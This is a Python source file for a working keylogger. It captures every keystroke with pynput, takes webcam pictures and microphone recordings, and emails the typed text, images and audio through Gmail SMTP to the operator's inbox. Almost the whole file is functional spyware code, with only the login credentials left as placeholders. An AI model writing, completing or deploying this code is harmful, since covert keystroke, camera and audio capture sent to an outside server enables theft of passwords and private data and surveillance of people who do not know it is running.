import smtplib                                               # smtp email protocol
import os
from pynput.keyboard import Key, Listener                    # lib for detecting keys
import RecordMic                                             # this is used to record audio
import ScreenDetection                                       # this is used to take a picture with laptop camera
from email.mime.text import MIMEText
from email.mime.audio import MIMEAudio
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart


#############################################################################
print( ''' 
 _   __           _                             
| | / /          | |                            
| |/ /  ___ _   _| | ___   __ _  __ _  ___ _ __ 
|    \ / _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|
| |\  \  __/ |_| | | (_) | (_| | (_| |  __/ |   
\_| \_/\___|\__, |_|\___/ \__, |\__, |\___|_|   
             __/ |         __/ | __/ |          
            |___/         |___/ |___/           
''')
#############################################################################
ImgFileName = 'myscreenshot.png'                             # file name for saved image
AudioFileName = 'myrecording.au'                             # file name for saved audio
#############################################################################
# |setting up email|
email = 'put your gmail here'                                # email I am using for log destination
password = 'put the generated password here'                 # had to go to gmail settings and add app, then it generates password
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)             # port 465 is email client
try:
    server.login(email, password)                            # attempting to log into my email
    print(' Logged in! ')
except Exception as e:
    print(" Failed logging in! ")
    print(e)
#############################################################################
# |get key strokes|
entire_log = ''                                              # used for storing all keys detected before sending via email
word = ''                                                    # used to get each word
limit = 20                                                   # once limit is reached send text

def on_press(key):
    global word
    global entire_log
    global email
    global limit

    if key == Key.space or key == Key.enter:                 # space or enter
        word += ' '                                          # add space to end of word
        entire_log += word                                   # append word to entire message
        word = ''                                            # set word to empty
        if len(entire_log) >= limit:                         # send message once limit is reached
            print(' limit reached')
            print(entire_log)
            send_log()                                       # this function sends the message once limit is reached
            ScreenDetection.TakePicture()                    # this function takes real time web cam capture
            SendImage(ImgFileName)
            RecordMic.TakeRecording()                        # this function takes real time recording
            SendAudio(AudioFileName)
            entire_log = ''                                  # set entire log back to empty after message is sent
            limit = 70                                       # changing total length of message for each email
    elif key == Key.shift_l or key == Key.shift_r:           # detecting shift
        print(' shift ')
        return
    elif key == Key.backspace:                               # detecting backspace
        print(' backspace ')
        word = word[:-1]
    else:                                                    # letter was hit
        char = f'{key}'                                      # take off ' ' around letter
        char = char[1:-1]                                    # keycode has ' ', this is how i remove it
        word += char                                         # now just simple text with no ' '

    if key == Key.esc:                                       # ignore esc key
        return False
#############################################################################
# send email from(my_self), to (my_self), and message from keylogger
def send_log():
    msg = MIMEMultipart()                                    # used to put title in subject box
    msg['Subject'] = 'Someone is typing!'                    # this is title
    text = MIMEText(entire_log)
    msg.attach(text)                                         # attaching text to body of email

    try:
        server.sendmail(email, email, msg.as_string())       # sending email
        print("Email has been sent!")
    except Exception as i:
        print("Error: unable to send email.")
        print(i)
#############################################################################
# send email from(my_self), to (my_self), and send image file
def SendImage(ImgFileName):
    with open(ImgFileName, 'rb') as f:
        img_data = f.read()                                  # storing image file in img_data

    msg = MIMEMultipart()
    msg['Subject'] = 'Screen Detection Found!'
    text = MIMEText("Image!")
    msg.attach(text)
    image = MIMEImage(img_data, name=os.path.basename(ImgFileName))
    msg.attach(image)

    try:
        server.sendmail(email, email, msg.as_string())
        print("Email has been sent!")
    except Exception as i:
        print("Error: unable to send email.")
        print(i)
#############################################################################
# sending audio file via email
def SendAudio(AudioFileName):
    with open(AudioFileName, 'rb') as f:
        audio_data = f.read()

    msg = MIMEMultipart()
    msg['Subject'] = 'Sound was detected!'
    text = MIMEText("Sound!")
    msg.attach(text)
    audio = MIMEAudio(audio_data, name=os.path.basename(AudioFileName))
    msg.attach(audio)

    try:
        server.sendmail(email, email, msg.as_string())
        print("Email has been sent!")
    except Exception as i:
        print("Error: unable to send email.")
        print(i)
#############################################################################
# setup listener to detect key strokes
with Listener(on_press=on_press) as listener:
    listener.join()                                          # listening/waiting for keys to be detected
#############################################################################
